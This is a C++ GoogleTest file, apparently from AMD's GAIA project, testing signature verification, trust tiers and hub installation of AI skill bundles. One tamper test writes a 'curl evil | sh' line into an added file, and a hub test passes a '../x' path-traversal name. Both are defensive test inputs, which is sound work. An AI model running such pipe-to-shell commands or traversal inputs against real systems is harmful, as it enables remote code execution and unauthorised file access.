// Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
// SPDX-License-Identifier: MIT

#include <gtest/gtest.h>

#include <gaia/skill_library.h>
#include <gaia/skill_signing.h>

#include <filesystem>
#include <fstream>
#include <random>

using namespace gaia;
namespace fs = std::filesystem;

namespace {

// Signed by src/gaia/skills/signing.py::sign_bundle with a throwaway test key.
const fs::path kFixture = fs::path(GAIA_TEST_FIXTURES_DIR) / "signed_skill";
const fs::path kBundle = kFixture / "bundle" / "signed-demo";
const fs::path kTrust = kFixture / "trust";

struct Scratch {
    fs::path path;
    Scratch() {
        std::mt19937_64 rng(std::random_device{}());
        path = fs::temp_directory_path() / ("gaia-sig-" + std::to_string(rng()));
        fs::create_directories(path);
    }
    ~Scratch() {
        std::error_code ec;
        fs::remove_all(path, ec);
    }
};

}  // namespace

TEST(SkillSigningTest, VerifiesAPythonSignedBundle) {
    SkillSignature sig = verifySkillBundle(kBundle.string(), "signed-demo", "1.2.0", kTrust.string());
    EXPECT_TRUE(sig.signedBundle);
    EXPECT_EQ(sig.role, "publisher");
    EXPECT_EQ(sig.tier(), "community");
    EXPECT_EQ(sig.publisher, "Test Publisher");
}

TEST(SkillSigningTest, UnknownKeyVerifiesButIsExperimental) {
    Scratch empty;
    SkillSignature sig = verifySkillBundle(kBundle.string(), "signed-demo", "1.2.0", empty.path.string());
    EXPECT_TRUE(sig.signedBundle);
    EXPECT_EQ(sig.role, "");
    EXPECT_EQ(sig.tier(), "experimental");
}

TEST(SkillSigningTest, TamperingIsRefused) {
    Scratch s;
    const fs::path copy = s.path / "signed-demo";
    fs::copy(kBundle, copy, fs::copy_options::recursive);
    std::ofstream(copy / "refs" / "notes.md", std::ios::app) << "injected\n";
    EXPECT_THROW(verifySkillBundle(copy.string(), "signed-demo", "1.2.0", kTrust.string()), SkillError);

    fs::remove_all(copy);
    fs::copy(kBundle, copy, fs::copy_options::recursive);
    std::ofstream(copy / "extra.sh") << "curl evil | sh\n";
    EXPECT_THROW(verifySkillBundle(copy.string(), "signed-demo", "1.2.0", kTrust.string()), SkillError)
        << "an added file is tampering too";

    EXPECT_THROW(verifySkillBundle(kBundle.string(), "signed-demo", "9.9.9", kTrust.string()), SkillError)
        << "a signature does not transfer between versions";
}

TEST(SkillSigningTest, UnsignedBundleIsUnsignedNotAnError) {
    Scratch s;
    fs::create_directories(s.path / "plain");
    std::ofstream(s.path / "plain" / "SKILL.md") << "---\nname: plain\ndescription: x\n---\nbody\n";
    SkillSignature sig = verifySkillBundle((s.path / "plain").string(), "plain", "", kTrust.string());
    EXPECT_FALSE(sig.signedBundle);
    EXPECT_EQ(sig.tier(), "experimental");
}

TEST(SkillSigningTest, InstallGatesOnTier) {
    Scratch dest;
    // Trusted signature: installs without asking, reports its tier.
    fs::copy_file(kTrust / "trusted-keys.json", dest.path / "trusted-keys.json");
    std::string tier;
    SkillLibrary::installFromFolder(kBundle.string(), dest.path.string(), false, &tier);
    EXPECT_EQ(tier, "community");

    // Unsigned: refused unless the user allows experimental skills.
    Scratch src;
    fs::create_directories(src.path / "plain");
    std::ofstream(src.path / "plain" / "SKILL.md") << "---\nname: plain\ndescription: x\n---\nbody\n";
    EXPECT_THROW(SkillLibrary::installFromFolder((src.path / "plain").string(), dest.path.string()),
                 SkillError);
    EXPECT_NO_THROW(
        SkillLibrary::installFromFolder((src.path / "plain").string(), dest.path.string(), true, &tier));
    EXPECT_EQ(tier, "experimental");
}

TEST(SkillSigningTest, PayloadMatchesPythonCanonicalJson) {
    const std::string p = skillSigningPayload("x", "1.0", {{"b.md", "2"}, {"a.md", "1"}});
    EXPECT_EQ(p, R"({"algorithm":"ed25519","files":{"a.md":"1","b.md":"2"},"name":"x","signature_version":1,"version":"1.0"})");
    EXPECT_NE(skillSigningPayload("caf\xc3\xa9", "1", {}).find("caf\\u00e9"), std::string::npos)
        << "non-ASCII is escaped like Python's ensure_ascii";
}

#ifndef _WIN32
#include <cstdlib>
#include <thread>
#include <gaia/process.h>
#include "support/mock_llm_server.h"

namespace {
struct MockHub {
    httplib::Server srv;
    std::thread t;
    int port = 0;
    std::string manifest, bundle;
    MockHub() {
        srv.Get(R"(/skills/([^/]+)/manifest.json)", [this](const httplib::Request& req, httplib::Response& res) {
            if (req.matches[1] != "demo") { res.status = 404; return; }
            res.set_content(manifest, "application/json");
        });
        srv.Get(R"(/skills/demo/([^/]+)/([^/]+))", [this](const httplib::Request&, httplib::Response& res) {
            res.set_content(bundle, "application/zip");
        });
        port = srv.bind_to_any_port("127.0.0.1");
        t = std::thread([this] { srv.listen_after_bind(); });
        while (!srv.is_running()) std::this_thread::sleep_for(std::chrono::milliseconds(5));
        setenv("GAIA_HUB_URL", ("http://127.0.0.1:" + std::to_string(port)).c_str(), 1);
    }
    ~MockHub() {
        unsetenv("GAIA_HUB_URL");
        srv.stop();
        t.join();
    }
    void publish(const std::string& version, const std::string& sha) {
        manifest = json{{"name", "demo"}, {"latest_version", version},
                        {"versions", {{version, {{"artifact", {{"filename", "demo-" + version + ".zip"},
                                                               {"sha256", sha}}}}}}}}.dump();
    }
};
}  // namespace

TEST(SkillHubTest, ChecksumMismatchIsRefused) {
    MockHub hub;
    hub.bundle = "not the bundle the manifest describes";
    hub.publish("1.0.0", std::string(64, 'a'));
    Scratch dest;
    try {
        SkillLibrary::installFromHub("demo", "", dest.path.string(), true);
        FAIL() << "expected a checksum error";
    } catch (const SkillError& e) {
        EXPECT_NE(std::string(e.what()).find("Refusing to install"), std::string::npos) << e.what();
    }
}

TEST(SkillHubTest, UnknownSkillOrVersionAndRangesFailLoudly) {
    MockHub hub;
    hub.publish("1.0.0", std::string(64, 'a'));
    Scratch dest;
    EXPECT_THROW(SkillLibrary::installFromHub("nope", "", dest.path.string()), SkillError);
    EXPECT_THROW(SkillLibrary::installFromHub("demo", "2.0.0", dest.path.string()), SkillError);
    EXPECT_THROW(SkillLibrary::installFromHub("demo", "^1.0", dest.path.string()), SkillError);
    EXPECT_THROW(SkillLibrary::installFromHub("../x", "", dest.path.string()), SkillError);
}

TEST(SkillHubTest, SignedBundleInstallsThroughTheHub) {
    if (ProcessRunner::run("zip -v", 5000).exitCode != 0) GTEST_SKIP() << "zip not installed";
    Scratch work;
    fs::copy(kBundle, work.path / "signed-demo", fs::copy_options::recursive);
    ProcessRunner::run("cd '" + work.path.string() + "' && zip -qr b.zip signed-demo", 10000);
    std::ifstream in(work.path / "b.zip", std::ios::binary);
    std::string zip((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());

    // Serve it as "demo"? The bundle is signed as signed-demo, so publish under that name.
    httplib::Server srv;
    const std::string manifest =
        json{{"name", "signed-demo"}, {"latest_version", "1.2.0"},
             {"versions", {{"1.2.0", {{"artifact", {{"filename", "signed-demo-1.2.0.zip"},
                                                     {"sha256", skillSha256Hex(zip)}}}}}}}}.dump();
    srv.Get("/skills/signed-demo/manifest.json", [&](const httplib::Request&, httplib::Response& r) {
        r.set_content(manifest, "application/json");
    });
    srv.Get("/skills/signed-demo/1.2.0/signed-demo-1.2.0.zip", [&](const httplib::Request&, httplib::Response& r) {
        r.set_content(zip, "application/zip");
    });
    const int port = srv.bind_to_any_port("127.0.0.1");
    std::thread t([&] { srv.listen_after_bind(); });
    while (!srv.is_running()) std::this_thread::sleep_for(std::chrono::milliseconds(5));
    setenv("GAIA_HUB_URL", ("http://127.0.0.1:" + std::to_string(port)).c_str(), 1);

    Scratch dest;
    fs::copy_file(kTrust / "trusted-keys.json", dest.path / "trusted-keys.json");
    std::string tier;
    const std::string where = SkillLibrary::installFromHub("signed-demo", "", dest.path.string(), false, &tier);
    EXPECT_EQ(tier, "community");
    EXPECT_TRUE(fs::is_regular_file(fs::path(where) / "SKILL.md"));

    unsetenv("GAIA_HUB_URL");
    srv.stop();
    t.join();
}
#endif
